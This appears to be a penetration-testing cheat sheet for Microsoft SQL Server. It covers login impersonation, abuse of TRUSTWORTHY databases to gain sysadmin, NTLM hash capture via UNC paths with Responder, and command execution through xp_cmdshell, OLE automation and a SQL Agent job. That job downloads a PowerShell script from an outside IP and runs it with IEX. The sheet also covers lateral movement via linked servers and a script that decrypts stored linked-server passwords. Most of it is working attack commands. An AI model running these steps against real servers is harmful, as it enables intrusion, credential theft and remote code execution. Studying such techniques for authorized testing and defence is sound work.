---
description: MSSQL Privilege Escalation
---

# MSSQL Attacks

`privilege escalation` in `MSSQL Server`,  where the goal is to get a login with the server-level [sysadmin](https://learn.microsoft.com/en-us/sql/relational-databases/security/authentication-access/server-level-roles?view=sql-server-ver16) role, like the `sa` login which is disabeld by default.

### <mark style="color:yellow;">Impersonating Logins</mark>

MSSQL has a statement EXECUTE AS which allows to execute commands of a session to another login or user, like impersonation.&#x20;

Check which logins are allowed to impersonate.

```sql
SELECT name FROM sys.server_permissions
JOIN sys.server_principals
ON grantor_principal_id = principal_id
WHERE permission_name = 'IMPERSONATE';

# oneliner
SELECT name FROM sys.server_permissions JOIN sys.server_principals ON grantor_principal_id = principal_id WHERE permission_name = 'IMPERSONATE';
```

Impersonate SA login

```sql
# Impersonate
EXECUTE AS LOGIN = 'sa';

# Use database
use priv_esc;

# Show tables
SELECT name FROM sys.tables;

# Select column
SELECT * FROM flag;
```

### <mark style="color:yellow;">Abusing Trustworthy Databases</mark>

{% hint style="info" %}
MSSQL Server `databases` have a property called [TRUSTWORTHY](https://learn.microsoft.com/en-us/sql/relational-databases/security/trustworthy-database-property?view=sql-server-ver16). Sysadmins can enable this and then assign the server-level `sysadmin` role to arbitrary `logins`.
{% endhint %}

Query DB users with db\_owner role

```sql
USE webshop;
SELECT b.name, c.name
FROM webshop.sys.database_role_members a
JOIN webshop.sys.database_principals b ON a.role_principal_id = b.principal_id
LEFT JOIN webshop.sys.database_principals c ON a.member_principal_id = c.principal_id;

# one-liner
USE webshop; SELECT b.name, c.name FROM webshop.sys.database_role_members a JOIN webshop.sys.database_principals b ON a.role_principal_id = b.principal_id LEFT JOIN webshop.sys.database_principals c ON a.member_principal_id = c.principal_id;
```

Impersonate as ws\_user and and check for db\_owner role

```sql
USE webshop;
EXECUTE AS LOGIN = 'ws_user';
SELECT IS_ROLEMEMBER('db_owner');
```

Assign user in this case ws\_dev sysadmin role

```sql
CREATE PROCEDURE sp_privesc
WITH EXECUTE AS OWNER
AS
	EXEC sp_addsrvrolemember 'ws_dev', 'sysadmin'
GO

EXECUTE sp_privesc;
DROP PROCEDURE sp_privesc;
```

### <mark style="color:yellow;">UNC Path Injection</mark>

We can capture NTLMv2 hashes from a user the MSSQL server is running as. Default is `NT SERVICE\mssqlserver`. We can use undocumented extended stored procedures:

* `xp_fileexist`: Checks if file exists
* `xp_dirtree`: Returns a directory tree&#x20;
* `xp_subdirs`: Returns a list of sub-directories

Example if hosts file exists

```sql
EXEC xp_fileexist 'C:\Windows\System32\drivers\etc\hosts';
```

Setup Responder

```shell-session
sudo responder -I tun0 -v
```

Then access

```sql
EXEC xp_dirtree '\\<IP>\a';
EXEC xp_subdirs '\\<IP>\a';
EXEC xp_fileexist '\\<IP>\a';
```

## Command Execution

After escalating privileges to a `login` with the `sysadmin` role its possible to get CE.&#x20;

* Using xp\_cmdshell
* Creating a MSSQL Server Agent Job
* Create and execute [OLE Automation stored procedure](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/ole-automation-stored-procedures-transact-sql?view=sql-server-ver16).

#### Enable xp\_cmdshell

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;

EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

# Test
EXEC xp_cmdshell 'whoami';
```

### <mark style="color:yellow;">Command Execution via MSSQL Server Agent Job</mark>

Create a new job which uses Powershell to download and execute a script.

```sql
USE msdb;  
GO

EXEC sp_add_job  
    @job_name = N'Malicious Job';
GO

EXEC sp_add_jobstep  
    @job_name = N'Malicious Job',
    @step_name = N'Execute PowerShell Script',
    @subsystem = N'PowerShell',
    @command = N'(New-Object Net.WebClient).DownloadString("http://10.10.14.104/a")|IEX;',
    @retry_attempts = 5,
    @retry_interval = 5;
GO

EXEC sp_add_jobserver  
    @job_name = N'Malicious Job';
GO

EXEC sp_start_job
    @job_name = N'Malicious Job';
GO
```

### <mark style="color:yellow;">Command Execution via OLE Automation Stored Procedure</mark>

By default this is disabled but it can be enabled

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;

EXEC sp_configure 'ole automation procedures', 1;
RECONFIGURE;
```

OLE Automation allows to use other languages like VBS from a SQL query. Create a wscript.shell and execute a command.

```sql
DECLARE @objShell INT;
DECLARE @output varchar(8000);

EXEC @output = sp_OACreate 'wscript.shell', @objShell Output;
EXEC sp_OAMethod @objShell, 'run', NULL, 'cmd.exe /c "whoami > C:\Windows\Tasks\tmp.txt"';
```

## Lateral Movement

In `MSSQL Server`, there is the concept of [linked servers](https://learn.microsoft.com/en-us/sql/relational-databases/linked-servers/create-linked-servers-sql-server-database-engine?view=sql-server-ver16). By linking server A to B its possible to execute queries on server B from server A.&#x20;

* OPENQUERY: Run query on linked server
* EXECUTE AT: Run query on linked server
* OPENROWSET: Connects and runs a query on server

### <mark style="color:yellow;">Enumerate Linked Servers</mark>

```sql
EXEC sp_linkedservers;
```

Use OPENQUERY to return database

```sql
SELECT * FROM OPENQUERY(SQL02, 'SELECT name, database_id, create_date FROM sys.databases');
```

### <mark style="color:yellow;">Remote Command Execution via EXECUTE AT</mark>

Check permissions, we need sysadmin role.&#x20;

```sql
SELECT * FROM OPENQUERY(SQL02, 'SELECT IS_SRVROLEMEMBER(''sysadmin'')');
```

Execute a command remotely using linked server

```sql
EXECUTE ('EXEC sp_configure "show advanced options", 1; RECONFIGURE; EXEC sp_configure "xp_cmdshell", 1; RECONFIGURE; EXEC xp_cmdshell "whoami";') AT SQL02;
```

### <mark style="color:yellow;">Decrypting Linked Server Passwords (Post-Exploitation)</mark>

With a user with sysadmin role we can extract credentials to linked servers.

```sql
SELECT sysservers.srvname, syslnklgns.name, syslnklgns.pwdhash
FROM master.sys.syslnklgns
INNER JOIN master.sys.sysservers
ON syslnklgns.srvid = sysservers.srvid WHERE LEN(pwdhash) > 0;

# Get hash
SELECT * FROM sys.key_encryptions;
```

Decrypt Service Master Key, first get entropy bytes

```sh
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\MSSQL16.MSSQLSERVER\Security" -Name "Entropy"
```

Then use script&#x20;

```powershell
$encryptedData = "0xFFFFFFFF500100<SNIP>";
$encryptedData = $encryptedData.Substring(18); # Remove 0x and padding
$encryptedData = [byte[]] -split ($encryptedData -replace '..', '0x$& ');

$entropy = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\MSSQL16.MSSQLSERVER\Security" -Name "Entropy").Entropy;

Add-Type -AssemblyName System.Security;
$SMK = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedData, $entropy, 'LocalMachine');
Write-Host (($SMK|ForEach-Object ToString X2) -join '');
```

Split pwdhash into IV and Ciphertext

```sql
SELECT
	name,
	SUBSTRING(pwdhash, 5, 16) AS 'IV',
	SUBSTRING(pwdhash, 21, LEN(pwdhash) - 20) AS 'Ciphertext'
FROM sys.syslnklgns
WHERE LEN(pwdhash) > 0;
```

Decrypt password [CyberChef recipe](https://gchq.github.io/CyberChef/#recipe=AES_Decrypt\(%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D,'CBC','Hex','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D\)Decode_text\('UTF-16LE%20\(1200\)'\)).

{% hint style="info" %}
Or automate the process above with this [script](https://github.com/NetSPI/Powershell-Modules/blob/master/Get-MSSQLLinkPasswords.psm1) from NetSPI.
{% endhint %}

## MSSQL Commands

```sql
SQL (ws_dev  guest@master)> help

    lcd {path}                 - changes the current local directory to {path}
    exit                       - terminates the server process (and this session)
    enable_xp_cmdshell         - you know what it means
    disable_xp_cmdshell        - you know what it means
    enum_db                    - enum databases
    enum_links                 - enum linked servers
    enum_impersonate           - check logins that can be impersonated
    enum_logins                - enum login users
    enum_users                 - enum current db users
    enum_owner                 - enum db owner
    exec_as_user {user}        - impersonate with execute as user
    exec_as_login {login}      - impersonate with execute as login
    xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
    xp_dirtree {path}          - executes xp_dirtree on the path
    sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
    use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
    ! {cmd}                    - executes a local shell cmd
    show_query                 - show query
    mask_query                 - mask query
```

More

```sql
# Enum impersonate
enum_impersonate

# Execute as
exec_as_login sa

# Dirtree
xp_dirtree \\10.10.14.104\a

# Enable xp_cmdshell
enable_xp_cmdshell

# Start a job
sp_start_job cmd.exe /c "whoami > C:\Windows\Tasks\tmp.txt"

# Use linked server
use_link SQL02
```

